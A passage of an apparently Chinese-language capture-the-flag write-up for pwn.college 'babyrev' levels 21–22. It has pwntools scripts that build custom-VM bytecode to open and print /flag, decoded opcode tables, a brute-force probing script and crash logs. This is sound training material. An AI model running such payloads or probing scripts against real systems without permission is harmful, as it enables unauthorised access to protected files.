&#x27;a&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]  <br>imm_a= <span class="hljs-number">0x404034</span>                                  <span class="hljs-comment"># IMM a = 0x34</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400867</span>                                 <span class="hljs-comment"># IMM b = 0x67     &#x27;g&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                               <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]      <br>imm_a= <span class="hljs-number">0x404030</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400800</span>                                 <span class="hljs-comment"># IMM b = 0     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_open = <span class="hljs-number">0x082040</span>                             <span class="hljs-comment"># open /flag</span><br>payload += p32(sys_open, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400840</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_c = <span class="hljs-number">0x4020ff</span>                                <span class="hljs-comment"># IMM c = 0xff</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x080420</span>                              <span class="hljs-comment"># SYS Read</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x404001</span>                                <span class="hljs-comment"># IMM a = 0x01</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400840</span>                                 <span class="hljs-comment"># IMM b = 0x3     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x081020</span>                             <span class="hljs-comment"># SYS write</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>exi = <span class="hljs-number">0x080108</span>                          <span class="hljs-comment"># exit</span><br><span class="hljs-comment"># pause()</span><br>payload += p32(exi, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(p.readline())<br><br>p.close()<br></code></pre></td></tr></table></figure>



<h4 id="level22-0"><a href="#level22-0" class="headerlink" title="level22.0"></a>level22.0</h4><p>因为opcode和var_code的总数不是很多，可以记录一下。</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>op</th>
</tr>
</thead>
<tbody><tr>
<td>0x1</td>
<td>ADD</td>
</tr>
<tr>
<td>0x2</td>
<td>IMM</td>
</tr>
<tr>
<td>0x4</td>
<td>STK</td>
</tr>
<tr>
<td>0x8</td>
<td>JMP</td>
</tr>
<tr>
<td>0x10</td>
<td>LDM</td>
</tr>
<tr>
<td>0x20</td>
<td>SYS</td>
</tr>
<tr>
<td>0x40</td>
<td>STM</td>
</tr>
<tr>
<td>0x80</td>
<td>CMP</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>变量记录如下：</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>Code</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>0x04</td>
</tr>
<tr>
<td>b</td>
<td>0x40</td>
</tr>
<tr>
<td>c</td>
<td>0x01</td>
</tr>
<tr>
<td>d</td>
<td>0x10</td>
</tr>
<tr>
<td>s</td>
<td>0x02</td>
</tr>
<tr>
<td>i</td>
<td>0x80</td>
</tr>
<tr>
<td>f</td>
<td>0x08</td>
</tr>
</tbody></table>
<p>并且测试的时候发现，arg1在三字节的第一个位置，arg2在三字节中的第二个位置，opcode在最后。</p>
<p>关于SYS而言，Sleep是08，write是01，read_code是04，open是20，exit是40，read是80</p>
<p>针对SYS指令，第一个字节是syscode，第二个位置是变量code，第三个位置是opcode。</p>
<p>这种情况下，改exp就很快了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-21-1&#x27;, &#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-22-0&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_a= <span class="hljs-number">0x043002</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x402f02</span>                                 <span class="hljs-comment"># IMM b = 0x2f     &#x27;/&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x043102</span>                                  <span class="hljs-comment"># IMM a = 0x31</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406602</span>                                 <span class="hljs-comment"># IMM b = 0x66     &#x27;f&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                     <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x043202</span>                                  <span class="hljs-comment"># IMM a = 0x32</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406c02</span>                                 <span class="hljs-comment"># IMM b = 0x6c     &#x27;l&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                 <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>imm_a= <span class="hljs-number">0x043302</span>                                 <span class="hljs-comment"># IMM a = 0x33</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406102</span>                                 <span class="hljs-comment"># IMM b = 0x61     &#x27;a&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                 <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]  <br>imm_a= <span class="hljs-number">0x043402</span>                                  <span class="hljs-comment"># IMM a = 0x34</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406702</span>                                 <span class="hljs-comment"># IMM b = 0x67     &#x27;g&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                               <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]      <br>imm_a= <span class="hljs-number">0x043002</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400002</span>                                 <span class="hljs-comment"># IMM b = 0     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_open = <span class="hljs-number">0x200420</span>                             <span class="hljs-comment"># open /flag</span><br>payload += p32(sys_open, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404002</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_c = <span class="hljs-number">0x01ff02</span>                                <span class="hljs-comment"># IMM c = 0xff</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x800120</span>                              <span class="hljs-comment"># SYS Read</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x040102</span>                                <span class="hljs-comment"># IMM a = 0x01</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404002</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x010420</span>                             <span class="hljs-comment"># SYS write</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>exi = <span class="hljs-number">0x0400420</span>                          <span class="hljs-comment"># exit</span><br><span class="hljs-comment"># pause()</span><br>payload += p32(exi, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    <span class="hljs-built_in">print</span>(p.readline())<br><br>p.close()<br></code></pre></td></tr></table></figure>



<h4 id="level22-1"><a href="#level22-1" class="headerlink" title="level22.1"></a>level22.1</h4><p>根据discord以及一些别人的wp，发现得查看Crash信息，才能知道。跑一下爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>command= [<span class="hljs-string">&#x27;/challenge/babyrev-level-22-0&#x27;</span>]<br><br>data = <span class="hljs-built_in">bytearray</span>()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-string">&#x27;&#x27;</span>)<br><br>values = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> values:<br>    data.append(<span class="hljs-number">0x31</span>) <span class="hljs-comment"># arg1不相关，因此可以随便设置一个。但是得设置！</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> values:<br>        data.append(j)<br>        data.append(i)<br>        <span class="hljs-built_in">print</span>(data.<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">try</span>:<br>            res = subprocess.run(command,<span class="hljs-built_in">input</span>=data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,timeout=<span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res.txt&#x27;</span>,<span class="hljs-string">&#x27;ab&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                file.write(data.<span class="hljs-built_in">hex</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>                file.write(res.stdout[<span class="hljs-number">1074</span>:])<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;timeout&quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>        data.pop()<br>        data.pop()<br>    data.clear()<br></code></pre></td></tr></table></figure>

<p>对于22.0跑出来的结果如下（过滤出超时的部分）：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">timeout</span> <span class="hljs-number">310108</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310208</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310408</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310808</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">311008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">312008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">314008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">318008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310220</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310420</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310820</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">311020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">314020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">318020</span><br></code></pre></td></tr></table></figure>

<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs inform7">310101<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> ADD ? c<br>Machine CRASHED due to: unknown register<br>310201<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> ADD ? s<br>Machine CRASHED due to: unknown register<br>310401<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> ADD ? a<br>Machine CRASHED due to: unknown register<br>310801 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> ADD ? f<br>Machine CRASHED due to: unknown register<br>311001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> ADD ? d<br>Machine CRASHED due to: unknown register<br>312001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> ADD ? ?<br>Machine CRASHED due to: unknown register<br>314001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> ADD ? b<br>Machine CRASHED due to: unknown register<br>318001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> ADD ? i<br>Machine CRASHED due to: unknown register<br>310102<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> IMM ? = 0x1<br>Machine CRASHED due to: unknown register<br>310202 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> IMM ? = 0x2<br>Machine CRASHED due to: unknown register<br>310402<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> IMM ? = 0x4<br>Machine CRASHED due to: unknown register<br>310802 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> IMM ? = 0x8<br>Machine CRASHED due to: unknown register<br>311002<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> IMM ? = 0x10<br>Machine CRASHED due to: unknown register<br>312002 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> IMM ? = 0x20<br>Machine CRASHED due to: unknown register<br>314002 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> IMM ? = 0x40<br>Machine CRASHED due to: unknown register<br>318002 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> IMM ? = 0x80<br>Machine CRASHED due to: unknown register<br>310104 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> STK ? c<br><span class="hljs-comment">[s]</span> ... pushing c<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310204 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> STK ? s<br><span class="hljs-comment">[s]</span> ... pushing s<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310404 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> STK ? a<br><span class="hljs-comment">[s]</span> ... pushing a<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310804 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> STK ? f<br><span class="hljs-comment">[s]</span> ... pushing f<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>311004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> STK ? d<br><span class="hljs-comment">[s]</span> ... pushing d<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>312004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> STK ? ?<br><span class="hljs-comment">[s]</span> ... pushing 